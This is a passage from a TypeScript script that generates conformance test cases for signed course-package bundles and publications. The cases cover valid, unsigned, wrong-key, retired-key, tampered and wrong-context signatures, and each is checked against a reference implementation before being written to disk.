  resolveCase("compose", "repeated-shared-unit", "Two modules include the same safety unit: it appears once, at its first position, and the second is reported as repeated.", ["§12.4"], courseWith([mod("cells", CELLS, "^2.0.0"), mod("sources", HIST, "^1.0.0")]), [cells, history, safety]);
}

// ---------------------------------------------------------------------------------------------
// bundle/ and publication/: signatures (§15, §16)

async function testKey(name: string): Promise<SigningIdentity> {
  const path = join(KEYS, `${name}.private.jwk.json`);
  if (!existsSync(path)) {
    mkdirSync(KEYS, { recursive: true });
    writeFileSync(path, formatJson(await (await SigningIdentity.generate()).exportJwk()));
  }
  return SigningIdentity.fromJwk(JSON.parse(readFileSync(path, "utf8")));
}
const publisher = await testKey("test-publisher");
const stranger = await testKey("test-stranger");
const keyEntry = async (identity: SigningIdentity, retiresAt?: string) => ({ keyId: await keyIdFor(identity.publicKey), publicKey: identity.publicKey, ...(retiresAt === undefined ? {} : { retiresAt }) });
writeFileSync(join(KEYS, "test-publisher.publisher.json"), formatJson({ domain: "example.net", keys: [await keyEntry(publisher)] }));

const AT = "2026-11-07T00:00:00Z";
const PUBLISHED_AT = "2026-11-01T00:00:00Z";
const trustFor = async (keys: Awaited<ReturnType<typeof keyEntry>>[], localDomains: string[] = []) => formatJson({ localDomains, publishers: [{ domain: "example.net", keys }] });

{
  const safety = leaf(SAFETY, "1.0.0");
  const course = courseWith([mod("safety", SAFETY, "1.0.0")], {}, "example.net/course");
  const lock = await lockOf(course, [safety]);
  const courseFiles = { ...course, "ocs.lock": lock };
  const sign = async (files: Files, identity = publisher): Promise<SignedEnvelope> => {
    const m = JSON.parse(files["ocs.json"]!) as { id: string; version: string };
    return signPackagePublication(identity, { packageId: m.id, version: m.version, digest: await packageDigest(files), publishedAt: PUBLISHED_AT });
  };
  const exported = formatJson(exportDoc({ id: "example.net/poem-image" }));
  const exportSignature = await signActivityExportPublication(publisher, { exportId: "example.net/poem-image", version: "1.0.0", digest: await activityExportDigest(exported), publishedAt: PUBLISHED_AT });
  const bundle = async (options: { courseSignature?: SignedEnvelope | undefined; moduleFiles?: Files; moduleSignature?: SignedEnvelope | undefined } = {}) =>
    serializeBundle(await buildBundle({
      course: { files: courseFiles, signature: "courseSignature" in options ? options.courseSignature : await sign(courseFiles) },
      modules: [{ files: options.moduleFiles ?? safety, signature: "moduleSignature" in options ? options.moduleSignature : await sign(safety) }],
      exports: [{ text: exported, signature: exportSignature }],
    }));
  const trust = await trustFor([await keyEntry(publisher)]);
  const bundleCase = async (id: string, description: string, text: string, trustText: string, expect?: Record<string, unknown>) =>
    cases.push({ id: `bundle/${id}`, kind: "bundle", description, spec: ["§15.3", "§16"], files: { "bundle.json": text, "trust.json": trustText }, input: { bundle: "bundle.json", trust: "trust.json", at: AT }, expect: expect ?? { accepted: true } });

  await bundleCase("valid-signed", "Every package and export signed by the publisher's approved key.", await bundle(), trust);
  await bundleCase("unsigned", "The module is not signed.", await bundle({ moduleSignature: undefined }), trust, { accepted: false, reason: "unsigned" });
  await bundleCase("local-domain-unsigned", "Nothing needs a signature from the destination's own domain.", await bundle({ courseSignature: undefined, moduleSignature: undefined }), await trustFor([await keyEntry(publisher)], ["example.net"]));
  await bundleCase("unapproved-key", "Signed by a key the destination did not approve.", await bundle({ moduleSignature: await sign(safety, stranger) }), trust, { accepted: false, reason: "unknown-publisher" });
  await bundleCase("retired-key", "Signed by a key that retired before the verification time.", await bundle(), await trustFor([await keyEntry(publisher, "2026-11-02T00:00:00Z")]), { accepted: false, reason: "unknown-publisher" });
  const other = leaf(SAFETY, "1.0.0");
  other["units/rules.json"] = formatJson({ ...JSON.parse(other["units/rules.json"]!), title: "Swapped" });
  await bundleCase("signature-for-other-content", "The module's signature is for other content.", await bundle({ moduleFiles: other, moduleSignature: await sign(safety) }), trust, { accepted: false, reason: "wrong-package" });
  const tampered = JSON.parse(await bundle()) as { packages: { files: Files }[] };
  tampered.packages[1]!.files["units/rules.json"] = formatJson({ ...JSON.parse(tampered.packages[1]!.files["units/rules.json"]!), title: "Tampered in transit" });
  await bundleCase("tampered-part", "A bundled file changed after the bundle was made, so it no longer matches its recorded digest.", formatJson(tampered), trust, { accepted: false, reason: "invalid" });

  const pubCase = (id: string, description: string, files: Files, input: Record<string, string>, expect: Record<string, unknown> | undefined) =>
    cases.push({ id: `publication/${id}`, kind: "publication", description, spec: ["§15"], files, input: { ...input, trust: "trust.json", at: AT }, ...(expect === undefined ? {} : { expect }) });
  const statement = { packageId: SAFETY, version: "1.0.0", digest: await packageDigest(safety), publishedAt: PUBLISHED_AT };
  pubCase("package-signed", "A package publication signed by the approved key.", { ...prefix("package", safety), "envelope.json": formatJson(await sign(safety)), "trust.json": trust }, { package: "package", envelope: "envelope.json" }, { ok: true, signed: true });
  const legacyBytes = new TextEncoder().encode(`schoolos-ocs/v1\0package-publication\0${canonicalJson(statement)}`);
  pubCase("package-legacy-context", "A package publication signed in the legacy context, which verifiers accept.", { ...prefix("package", safety), "envelope.json": formatJson({ payload: statement, signature: await publisher.sign(legacyBytes), keyId: publisher.keyId }), "trust.json": trust }, { package: "package", envelope: "envelope.json" }, { ok: true, signed: true });
  const exportStatement = { exportId: SAFETY, version: "1.0.0", digest: statement.digest, publishedAt: PUBLISHED_AT };
  pubCase("export-signature-as-package", "An export publication signature offered for a package with the same ID, version and digest: the contexts differ.", { ...prefix("package", safety), "envelope.json": formatJson(await signActivityExportPublication(publisher, exportStatement)), "trust.json": trust }, { package: "package", envelope: "envelope.json" }, { ok: false, reason: "bad-signature" });
  pubCase("export-signed", "An export publication signed by the approved key.", { "export.json": exported, "envelope.json": formatJson(exportSignature), "trust.json": trust }, { export: "export.json", envelope: "envelope.json" }, { ok: true, signed: true });
  const otherBytes = new TextEncoder().encode(`educateos-fleet/v1\0heartbeat\0${canonicalJson(statement)}`);
  pubCase("other-protocol-context", "The same statement signed in another protocol's context.", { ...prefix("package", safety), "envelope.json": formatJson({ payload: statement, signature: await publisher.sign(otherBytes), keyId: publisher.keyId }), "trust.json": trust }, { package: "package", envelope: "envelope.json" }, { ok: false, reason: "bad-signature" });
  const forged = { ...(await sign(safety)), payload: { ...statement, version: "1.0.1" } };
  pubCase("tampered-statement", "A signed statement edited after signing.", { ...prefix("package", safety), "envelope.json": formatJson(forged), "trust.json": trust }, { package: "package", envelope: "envelope.json" }, { ok: false, reason: "bad-signature" });
}

// ---------------------------------------------------------------------------------------------

function writeFiles(dir: string, files: Files) {
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), text);
  }
}

rmSync(CASES, { recursive: true, force: true });
const index: { id: string; kind: string; description: string }[] = [];
for (const c of cases) {
  const dir = join(CASES, c.id);
  writeFiles(dir, c.files);
  const actual = await runConformanceCase({ kind: c.kind, caseDir: dir, input: c.input });
  if (c.expect !== undefined) {
    for (const [key, value] of Object.entries(c.expect)) {
      if (JSON.stringify(actual[key]) !== JSON.stringify(value)) throw new Error(`${c.id}: the reference implementation returned ${JSON.stringify(actual)}, but the case expects ${JSON.stringify(c.expect)}`);
    }
  }
  const expect: Record<string, unknown> = c.expect ?? { ...actual };
  if (c.expect === undefined && "valid" in actual && actual.valid !== true) throw new Error(`${c.id}: expected valid, got ${JSON.stringify(actual)}`);
  if (c.expect === undefined && "problem" in actual) throw new Error(`${c.id}: unexpected problem ${JSON.stringify(actual)}`);
  // Lockfiles and outlines are compared from files, byte for byte.
  if (typeof expect.lock === "string") {
    writeFileSync(join(dir, "expected.lock"), expect.lock);
    expect.lock = "expected.lock";
  }
  if (expect.outline !== undefined) {
    writeFileSync(join(dir, "expected-outline.json"), formatJson(expect.outline));
    expect.outline = "expected-outline.json";
  }
  writeFileSync(join(dir, "case.json"), formatJson({ id: c.id, kind: c.kind, description: c.description, spec: c.spec, input: c.input, expect }));
  index.push({ id: c.id, kind: c.kind, description: c.description });
}
writeFileSync(join(CASES, "index.json"), formatJson({ suite: "OCS 1.1 conformance", version: "1.1.0", cases: index }));
console.log(`wrote ${cases.length} conformance cases`);
